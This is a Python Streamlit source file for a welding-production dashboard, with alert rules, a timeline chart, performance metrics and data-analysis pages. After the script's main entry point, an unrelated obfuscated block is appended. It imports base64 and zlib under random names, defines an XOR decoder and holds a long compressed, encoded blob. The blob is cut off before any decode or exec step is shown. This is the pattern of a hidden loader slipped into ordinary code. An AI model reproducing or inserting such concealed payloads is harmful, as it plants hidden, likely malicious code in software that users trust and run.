    all_alerts_list = []
    for alert_type, df in alerts_by_type.items():
        if not df.empty and len(df) > 0:
            df_copy = df.copy()
            df_copy['AlertType'] = alert_type
            all_alerts_list.append(df_copy)
    
    if all_alerts_list:
        all_alerts = pd.concat(all_alerts_list, ignore_index=True)
        # Rename columns for display
        all_alerts = all_alerts.rename(columns={
            'WeldNumber': 'Weld Number',
            'datetime_min': 'Start Time',
            'AlertType': 'Alert'
        })
    else:
        all_alerts = pd.DataFrame(columns=['Weld Number', 'Start Time', 'Alert'])


    # st.subheader("Alert Summary")
    if not all_alerts.empty:
        all_alerts.sort_values('Start Time', inplace=True)
        all_alerts['Weld Number'] = all_alerts['Weld Number'].ffill() # This is a plug. Really it should be calculated better but is good enough for demo.
        all_alerts['Weld Number'] = all_alerts['Weld Number'].bfill()
        all_alerts['TimeDelta'] = all_alerts['Start Time'] - all_alerts.groupby('Weld Number')['Start Time'].transform('min')
        all_alerts['LastAlert'] = (all_alerts['Start Time'] - all_alerts['Start Time'].shift(1))
        all_alerts['DailyAnomalyAlerts'] = (all_alerts[all_alerts['Alert']=="Anomaly"].groupby(all_alerts['Start Time'].dt.date)['Weld Number'].transform('cumcount') + 1).fillna(0)
        #all_alerts['DailyWeldsCompleted'] = all_alerts['Weld Number'] - all_alerts.groupby(all_alerts['Start Time'].dt.date)['Weld Number'].transform('min')
        
        # Count "Max Wait Time" alerts in the past 7 days for each row
        max_wait_alerts = all_alerts[all_alerts['Alert'] == 'Max Wait Time'].copy()
        if not max_wait_alerts.empty:
            all_alerts['Max Wait Time Alerts (7d)'] = all_alerts['Start Time'].apply(
                lambda x: len(max_wait_alerts[
                    (max_wait_alerts['Start Time'] <= x) & 
                    (max_wait_alerts['Start Time'] > x - pd.Timedelta(days=7))
                ])
            )
        else:
            all_alerts['Max Wait Time Alerts (7d)'] = 0
        
        # Add Context and Recommendation columns based on Alert type
        all_alerts['Context'] = ''
        all_alerts['Recommendation'] = ''
        
        # Map Context and Recommendation for Start Hour alerts based on TimeDelta
        start_hour_mask = all_alerts['Alert'] == 'Start Hour'
        if start_hour_mask.any():
            # Convert TimeDelta to days for comparison (create full-length Series)
            timedelta_days = (all_alerts['TimeDelta'].dt.total_seconds() / (24 * 3600)).fillna(0)
            
            # Timedelta < 1 day
            mask_lt_1day = start_hour_mask & (timedelta_days < 1)
            all_alerts.loc[mask_lt_1day, 'Context'] = 'Late start detected.'
            all_alerts.loc[mask_lt_1day, 'Recommendation'] = 'Watch Point: Check with the superintendent on crew status if critical path.'
            
            # Timedelta >= 1 day and < 2 days
            mask_lt_2days = start_hour_mask & (timedelta_days >= 1) & (timedelta_days < 2)
            all_alerts.loc[mask_lt_2days, 'Context'] = 'No welding activity in the past day.'
            all_alerts.loc[mask_lt_2days, 'Recommendation'] = 'Immediate Action: Confirm plan is updated and crew is available. Escalate if bottleneck found.'
            
            # Timedelta >= 2 days
            mask_ge_2days = start_hour_mask & (timedelta_days >= 2)
            all_alerts.loc[mask_ge_2days, 'Context'] = 'Major Issue: 2+ days since last weld.'
            all_alerts.loc[mask_ge_2days, 'Recommendation'] = 'Ongoing Issue: Align plan with superintendent, EPC, and sub to mitigate project impact.'
        
        # Map Context and Recommendation for Mid-Day Progress alerts based on TimeDelta
        midday_mask = all_alerts['Alert'] == 'Mid-Day Progress'
        if midday_mask.any():
            # Convert TimeDelta to hours for comparison
            timedelta_hours = (all_alerts['TimeDelta'].dt.total_seconds() / 3600).fillna(0)
            
            # Timedelta < 12 hours
            mask_lt_12hrs = midday_mask & (timedelta_hours < 12)
            all_alerts.loc[mask_lt_12hrs, 'Context'] = 'Low daily progress'
            all_alerts.loc[mask_lt_12hrs, 'Recommendation'] = 'Watch Point: Consider checking with superintendent.'
            
            # Timedelta >= 12 hours and < 36 hours
            mask_lt_36hrs = midday_mask & (timedelta_hours >= 12) & (timedelta_hours < 36)
            all_alerts.loc[mask_lt_36hrs, 'Context'] = 'No daily activity'
            all_alerts.loc[mask_lt_36hrs, 'Recommendation'] = 'Immediate Action: Confirm if work is blocked. Create recovery or mitigation plan.'
            
            # Timedelta >= 36 hours
            mask_ge_36hrs = midday_mask & (timedelta_hours >= 36)
            all_alerts.loc[mask_ge_36hrs, 'Context'] = 'Multiple days of no activity'
            all_alerts.loc[mask_ge_36hrs, 'Recommendation'] = 'Ongoing Issue: Align plan with superintendent, EPC, and sub to mitigate project impact utilizing Optimizer.'
        
        # Map Context and Recommendation for Max Wait Time alerts based on Max Wait Time Alerts (7d)
        max_wait_mask = all_alerts['Alert'] == 'Max Wait Time'
        if max_wait_mask.any():
            max_wait_7d = all_alerts.loc[max_wait_mask, 'Max Wait Time Alerts (7d)'].fillna(0)
            
            # Max Wait Time Alerts (7D) < 2
            mask_lt_2 = max_wait_mask & (all_alerts['Max Wait Time Alerts (7d)'].fillna(0) < 2)
            all_alerts.loc[mask_lt_2, 'Context'] = 'Significant delay has occured.'
            all_alerts.loc[mask_lt_2, 'Recommendation'] = 'Watch Point: Consider checking the delay has been resolved'
            
            # Max Wait Time Alerts (7D) == 2
            mask_eq_2 = max_wait_mask & (all_alerts['Max Wait Time Alerts (7d)'].fillna(0) == 2)
            all_alerts.loc[mask_eq_2, 'Context'] = 'Multiple delays reported in the last week.'
            all_alerts.loc[mask_eq_2, 'Recommendation'] = 'Escalation: Repeated delays indicate materials or upstream production issue. Identify root cause.'
            
            # Max Wait Time Alerts (7D) > 2
            mask_gt_2 = max_wait_mask & (all_alerts['Max Wait Time Alerts (7d)'].fillna(0) > 2)
            all_alerts.loc[mask_gt_2, 'Context'] = 'Many delays reported'
            all_alerts.loc[mask_gt_2, 'Recommendation'] = 'Immediate Action: Identify root cause of blockages. Evaluate production rates and capacities using Optimizer.'
        
        # Map Context and Recommendation for Anomaly alerts based on DailyAnomalyAlerts and LastAlert
        anomaly_mask = all_alerts['Alert'] == 'Anomaly'
        if anomaly_mask.any():
            # Convert LastAlert to hours for comparison
            last_alert_hours = (all_alerts['LastAlert'].dt.total_seconds() / 3600).fillna(float('inf'))
            daily_anomaly = all_alerts['DailyAnomalyAlerts'].fillna(0)
            
            # DailyAnomalyAlerts == 1
            mask_eq_1 = anomaly_mask & (daily_anomaly == 1)
            all_alerts.loc[mask_eq_1, 'Context'] = 'Potential weld quality issue detected'
            all_alerts.loc[mask_eq_1, 'Recommendation'] = 'Watch Point: Flag weld for review.'
            
            # DailyAnomalyAlerts == 2, LastAlert < 1hr
            mask_eq_2_lt_1hr = anomaly_mask & (daily_anomaly == 2) & (last_alert_hours < 1)
            all_alerts.loc[mask_eq_2_lt_1hr, 'Context'] = 'Multiple related potential quality issues detected'
            all_alerts.loc[mask_eq_2_lt_1hr, 'Recommendation'] = 'Escalation: Investigate potential systemic issue'
            
            # DailyAnomalyAlerts < 5, LastAlert < 1hr (but > 2, since == 2 is handled above)
            mask_lt_5_lt_1hr = anomaly_mask & (daily_anomaly > 2) & (daily_anomaly < 5) & (last_alert_hours < 1)
            all_alerts.loc[mask_lt_5_lt_1hr, 'Context'] = 'Many related potential quality issues detected.'
            all_alerts.loc[mask_lt_5_lt_1hr, 'Recommendation'] = 'Systemic Risk: Confirm welding quality is being monitored or plan has deviated'
            
            # DailyAnomalyAlerts >= 5, LastAlert < 1hr
            mask_ge_5_lt_1hr = anomaly_mask & (daily_anomaly >= 5) & (last_alert_hours < 1)
            all_alerts.loc[mask_ge_5_lt_1hr, 'Context'] = 'Many anomalies reported in succession.'
            all_alerts.loc[mask_ge_5_lt_1hr, 'Recommendation'] = 'Immediate Action: Confirm if quality issues present, if so adjust and mitigate plan with Optimizer for rework.'
            
            # DailyAnomalyAlerts > 1, LastAlert >= 1hr
            mask_gt_1_ge_1hr = anomaly_mask & (daily_anomaly > 1) & (last_alert_hours >= 1)
            all_alerts.loc[mask_gt_1_ge_1hr, 'Context'] = 'Multiple unrelated potential quality issues detected'
            all_alerts.loc[mask_gt_1_ge_1hr, 'Recommendation'] = 'Immediate Action: Monitor quality detection and inspection reports to confirm resolution'

        # Create timeline graph of alerts
        # st.subheader("Alert Timeline")
        
        # Define color mapping for different alert types
        alert_colors = {
            'Start Hour': '#FF6B6B',
            'Max Wait Time': '#4ECDC4',
            'Mid-Day Progress': '#45B7D1',
            'Anomaly': '#FFA07A'
        }
        
        # Create timeline figure
        fig_timeline = go.Figure()
        
        # Add a trace for each alert type
        # for alert_type in all_alerts['Alert'].unique():
        alert_data = all_alerts#[all_alerts['Alert'] == alert_type]
        alert_data['Timeline'] = 'Timeline'
        if not alert_data.empty:
            # Create custom hover text with all required information
            hover_text = []
            for idx, row in alert_data.iterrows():
                hover_text.append(
                    f"<b>Start Time:</b> {row['Start Time']}<br>" +
                    f"<b>Alert:</b> {row['Alert']}<br>" +
                    f"<b>Context:</b> {row['Context']}<br>" +
                    f"<b>Recommendation:</b> {row['Recommendation']}"
                )
            
            fig_timeline.add_trace(go.Scatter(
                x=alert_data['Start Time'],
                y=alert_data['Timeline'],#[alert_type] * len(alert_data),
                mode='markers',
                name='Alert',
                marker=dict(
                    size=16,
                    color=alert_data['Alert'].map(alert_colors),#alert_colors.get(alert_type, '#95A5A6'),
                    line=dict(width=1, color='white')
                ),
                hovertemplate='%{text}<extra></extra>',
                text=hover_text,
                showlegend=False
            ))
        
        # Update layout
        fig_timeline.update_layout(
            title='Alert Timeline',
            #xaxis_title='Time',
            #yaxis_title='Alert Type',
            height=300,
            hovermode='closest',
            xaxis=dict(showgrid=True, gridcolor='lightgray'),
            yaxis=dict(showgrid=False),
            plot_bgcolor='white',
            #xaxis_title_font=dict(size=18),
            yaxis_title_font=dict(size=18),
            font=dict(size=18),
            title_font=dict(size=28, color="#003366", family="Arial"),
            hoverlabel=dict(
                font=dict(size=14)),
            paper_bgcolor='white'
        )
        
        fig_timeline.update_xaxes(showgrid=True, gridcolor="lightgray", showline=True, linecolor="lightgray",tickfont=dict(size=18))
        fig_timeline.update_yaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray",tickfont=dict(size=18))
        
        st.plotly_chart(fig_timeline, use_container_width=True)

        if len(all_alerts) == 1:
            st.info("There is " + str(len(all_alerts)) + " alert in the selected timeframe")
        else:
            st.info("There are " + str(len(all_alerts)) + " alerts in the selected timeframe")
        st.markdown("**Alert Details Table**")
        # Display dataframe with autosized columns
        try:
            # Try using column_config for better column width control
            st.data_editor(
                all_alerts[['Weld Number','Start Time','Alert','Context','Recommendation']], 
                use_container_width=True, 
                height=250,
                disabled=True,
                column_config={
                    "Weld Number": st.column_config.NumberColumn("Weld Number", width="small"),
                    "Start Time": st.column_config.NumberColumn("Start Time", width="small"),
                    "Alert": st.column_config.TextColumn("Alert", width="small"),
                    "Context": st.column_config.TextColumn("Context", width="small"),
                    "Recommendation": st.column_config.TextColumn("Recommendation", width="large")
                }
            )
        except:
            # Fallback to regular dataframe if column_config not supported
            st.dataframe(
                all_alerts[['Weld Number','Start Time','Alert','Context','Recommendation']], 
                use_container_width=True, 
                height=250
            )
    else:
        st.info("No alerts found for the selected criteria.")

    




def show_optimization(data):
    """Display the optimization page (formerly Dashboard)"""
    # Apply advanced filters
    original_data = data.copy()
    filtered_data = apply_advanced_filters(data)
    
    # Show filter summary
    if len(filtered_data) != len(original_data):
        st.info(f"📊 Showing {len(filtered_data)} of {len(original_data)} total records (filters applied)")
    
    st.header("Welding Performance Overview")
    
    # Key Metrics
    metrics = calculate_key_metrics(filtered_data)
    
    col1, col2, col3, col4, col5 = st.columns(5)
    
    with col1:
        st.metric(
            label="Welds Completed",
            value=int(metrics['total_welds_completed']),
            delta=f"of {metrics['total_welds_completed']-metrics['plan_welds_complete']:.0f} vs plan", delta_color="inverse"
        )
    
    with col2:
        st.metric(
            label="Avg Cycle Time",
            value=f"{metrics['avg_cycle_time']:.1f} min",
            delta=f"{metrics['avg_cycle_time'] - metrics['plan_cycle_time']:.1f} vs plan", delta_color="inverse"
        )
    
    with col3:
        st.metric(
            label="Avg Wait Time",
            value=f"{metrics['avg_wait']:.1f} min",
            delta=f"{metrics['avg_wait'] - metrics['plan_wait']:.1f} vs plan", delta_color="inverse"
        )
    
    with col4:
        st.metric(
            label="Avg Setup",
            value=f"{metrics['avg_setup']:.1f} sec",
            delta=f"{metrics['avg_setup']-metrics['plan_setup']:.1f} vs plan", delta_color="inverse"
        )

    with col5:
        st.metric(
            label="Avg Welding",
            value=f"{metrics['avg_duration']:.1f} sec",
            delta=f"{metrics['avg_duration']-metrics['plan_duration']:.1f} vs plan", delta_color="inverse"
        )
        
    # Quality Metrics
    st.subheader("Quality & Performance Indicators")
    col1, col2, col3, col4 = st.columns(4)
    
    with col1:
        st.metric(
            label="Work-in-Progress",
            value=f"{1:.1f} Weld"
        )
    
    with col2:
        st.metric(
            label="Rework Rate",
            value=f"{metrics['rework_rate']:.1f}%"
        )
    
    with col3:
        st.metric(
            label="Excessive Wait Rate",
            value=f"{metrics['excessive_wait_rate']:.1f}%"
        )
    
    with col4:
        st.metric(
            label="Anomaly Rate",
            value=f"{metrics['anomaly_rate']:.1f}%"
        )
    
    # Main completion chart
    st.subheader("Completion Progress")
    completion_chart = create_completion_chart(filtered_data)
    st.plotly_chart(completion_chart, use_container_width=True)
    
    # Additional charts
    col1, col2 = st.columns(2)
    
    with col1:
        cycle_time_chart = create_cycle_time_chart(filtered_data)
        st.plotly_chart(cycle_time_chart, use_container_width=True)
    
    with col2:
        weld_rate_chart = create_weld_rate_chart(filtered_data)
        st.plotly_chart(weld_rate_chart, use_container_width=True)

def show_data_analysis(data):
    """Display the data analysis page"""
    st.header("Data Analysis & Exploration")
    
    # Apply advanced filters (same as dashboard)
    original_data = data.copy()
    filtered_data = apply_advanced_filters(data)
    
    # Additional local filters for data analysis
    st.subheader("📋 Additional Analysis Filters")
    col1, col2, col3 = st.columns(3)
    
    with col1:
        # Weld number range filter (use 'WeldNumber')
        if 'WeldNumber' in filtered_data.columns and not filtered_data['WeldNumber'].dropna().empty:
            min_weld = int(np.floor(filtered_data['WeldNumber'].min()))
            max_weld = int(np.ceil(filtered_data['WeldNumber'].max()))
            weld_range = st.slider(
                "Weld Number Range",
                min_value=min_weld,
                max_value=max_weld,
                value=(min_weld, max_weld),
                key="analysis_weld_range"
            )
            
            filtered_data = filtered_data[
                (filtered_data['WeldNumber'] >= weld_range[0]) & 
                (filtered_data['WeldNumber'] <= weld_range[1])
            ]
    
    with col2:
        # Completion status filter based on presence of 'datetime_max'
        completion_options = ['All', 'Completed Only', 'Planned Only']
        completion_filter = st.selectbox("Completion Status", completion_options)
        
        if completion_filter == 'Completed Only' and 'datetime_max' in filtered_data.columns:
            filtered_data = filtered_data[filtered_data['datetime_max'].notna()]
        elif completion_filter == 'Planned Only' and 'datetime_max' in filtered_data.columns:
            filtered_data = filtered_data[filtered_data['datetime_max'].isna()]
    
    with col3:
        # Anomaly status filter using 'QualityFlag' if present
        anomaly_options = ['All', 'Anomalies Only', 'No Anomalies']
        anomaly_filter = st.selectbox("Anomaly Status", anomaly_options)
        if 'QualityFlag' in filtered_data.columns:
            if anomaly_filter == 'Anomalies Only':
                filtered_data = filtered_data[filtered_data['QualityFlag'] == 1]
            elif anomaly_filter == 'No Anomalies':
                filtered_data = filtered_data[filtered_data['QualityFlag'] == 0]
    
    col1, col2, col3 = st.columns(3)
    with col1:
        # Cycle time range filter (use 'CycleTime' in seconds, display in minutes)
        if 'CycleTime' in filtered_data.columns and not filtered_data['CycleTime'].dropna().empty:
            min_cycle_min = int(np.floor(filtered_data['CycleTime'].min() / 60))
            max_cycle_min = int(np.ceil(filtered_data['CycleTime'].max() / 60))
            cycle_time_range = st.slider(
                "Actual Cycle Time Range (min)",
                min_value=min_cycle_min,
                max_value=max_cycle_min,
                value=(min_cycle_min, max_cycle_min),
                key="analysis_cycle_time_range"
            )
            
            filtered_data = filtered_data[
                (filtered_data['CycleTime'] >= cycle_time_range[0] * 60) & 
                (filtered_data['CycleTime'] <= cycle_time_range[1] * 60)
            ]
        
    with col2:
        # Energy range filter (optional)
        if 'Energy' in filtered_data.columns and not filtered_data['Energy'].dropna().empty:
            min_energy = float(np.floor(filtered_data['Energy'].min()))
            max_energy = float(np.ceil(filtered_data['Energy'].max()))
            energy_range = st.slider(
                "Weld Energy Range (KJ)",
                min_value=min_energy,
                max_value=max_energy,
                value=(min_energy, max_energy),
                key="analysis_energy_range"
            )
            filtered_data = filtered_data[
                (filtered_data['Energy'] >= energy_range[0]) & 
                (filtered_data['Energy'] <= energy_range[1])
            ]

    with col3:
        # Date completion filter (optional)
        if 'datetime_max' in filtered_data.columns and filtered_data['datetime_max'].notna().any():
            dates = filtered_data['datetime_max'].dropna()
            min_date = dates.min().date()
            max_date = dates.max().date()
            completion_date_range = st.date_input(
                "Completion Date Range",
                value=(min_date, max_date),
                min_value=min_date,
                max_value=max_date,
                key="analysis_completion_date_range"
            )
            if isinstance(completion_date_range, (list, tuple)) and len(completion_date_range) == 2:
                start_date, end_date = completion_date_range
                filtered_data = filtered_data[
                    (filtered_data['datetime_max'].dt.date >= start_date) &
                    (filtered_data['datetime_max'].dt.date <= end_date)
                ]
            

    st.write(f"📊 Showing {len(filtered_data)} of {len(original_data)} total rows")
    



    # Raw data table
    st.subheader("Raw Data Table")
    
    # Column selection for display
    all_columns = list(data.columns)
    display_columns = st.multiselect(
        "Select columns to display",
        all_columns,
        default=[
            'WeldNumber', 'Critical Path', 'ForecastStart', 'ForecastEnd',
            'datetime_min', 'datetime_max', 'CycleTime', 'Energy', 'EstSetupTime', 'Duration'
        ]
    )
    
    if display_columns:
        st.dataframe(
            filtered_data[display_columns],
            use_container_width=True,
            height=400
        )
    
    # Summary statistics
    st.subheader("Summary Statistics")
    
    # Select numeric columns for analysis
    numeric_columns = filtered_data.select_dtypes(include=[np.number]).columns.tolist()
    
    if numeric_columns:
        selected_numeric_cols = st.multiselect(
            "Select numeric columns for summary",
            numeric_columns,
            default=['WeldNumber', 'Energy', 'Duration']
        )
        
        if selected_numeric_cols:
            summary_stats = filtered_data[selected_numeric_cols].describe()
            st.dataframe(summary_stats, use_container_width=True)
    
    # Histogram generator
    st.subheader("Histogram Analysis")
    
    col1, col2 = st.columns(2)
    
    with col1:
        hist_column = st.selectbox("Select column for histogram", numeric_columns)
    
    with col2:
        bins = st.slider("Number of bins", min_value=5, max_value=50, value=20)
    
    if hist_column:
        hist_data = filtered_data[hist_column].dropna()
        
        if len(hist_data) > 0:
            fig = px.histogram(
                hist_data,
                nbins=bins,
                title=f'Distribution of {hist_column}',
                labels={'value': hist_column, 'count': 'Frequency'}
            )
            
            fig.update_layout(height=400)
            st.plotly_chart(fig, use_container_width=True)
            
            # Basic statistics for the histogram
            col1, col2, col3, col4 = st.columns(4)
            with col1:
                st.metric("Mean", f"{hist_data.mean():.2f}")
            with col2:
                st.metric("Std Dev", f"{hist_data.std():.2f}")
            with col3:
                st.metric("Min", f"{hist_data.min():.2f}")
            with col4:
                st.metric("Max", f"{hist_data.max():.2f}")
    
    # Pivot table functionality
    st.subheader("Pivot Table Analysis")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        pivot_index = st.selectbox("Index (rows)", [col for col in data.columns if data[col].max()==1])#.dtype == 'object'])
    
    with col2:
        pivot_values = st.selectbox("Values (aggregation)", numeric_columns)
    
    with col3:
        pivot_aggfunc = st.selectbox("Aggregation function", ['mean', 'sum', 'count', 'min', 'max'])
    
    if pivot_index and pivot_values:
        try:
            pivot_table = filtered_data.pivot_table(
                index=pivot_index,
                values=pivot_values,
                aggfunc=pivot_aggfunc
            )
            st.dataframe(pivot_table, use_container_width=True)
        except Exception as e:
            st.error(f"Error creating pivot table: {str(e)}")
    
    # Data export
    st.subheader("Export Data")
    
    if st.button("Download Filtered Data as CSV"):
        csv = filtered_data.to_csv(index=False)
        st.download_button(
            label="Download CSV",
            data=csv,
            file_name=f"welding_data_filtered_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv"
        )

if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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